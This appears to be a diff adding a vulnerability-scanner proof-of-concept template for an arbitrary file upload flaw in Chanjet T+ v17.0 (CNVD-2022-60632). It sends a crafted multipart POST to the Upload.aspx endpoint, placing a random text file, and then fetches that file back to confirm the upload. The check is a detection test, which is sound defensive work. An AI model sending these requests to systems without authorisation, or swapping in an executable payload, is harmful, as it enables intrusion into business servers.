@@ -1,0 +1,34 @@
+id: poc-yaml-cjt-Tplus-v17-file-upload-cnvd-2022-60632
+info:
+  name: 畅捷通T+ v17.0 任意文件上传(CNVD-2022-60632)
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  - CNVD-2022-60632
+  finger: 畅捷通T+
+variables:
+  t1: random_str(8)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwk2ReqGTj7lNYlt
+  data: '------WebKitFormBoundarywwk2ReqGTj7lNYlt
+
+    Content-Disposition: form-data; name="File1";filename="{{.t1}}.txt"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundarywwk2ReqGTj7lNYlt--
+
+    '
+  expression: status_code == 200 && contains(body,"<!DOCTYPE html>")
+- method: GET
+  path: /tplus/SM/SetupAccount/images/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,t2)
+transport: http
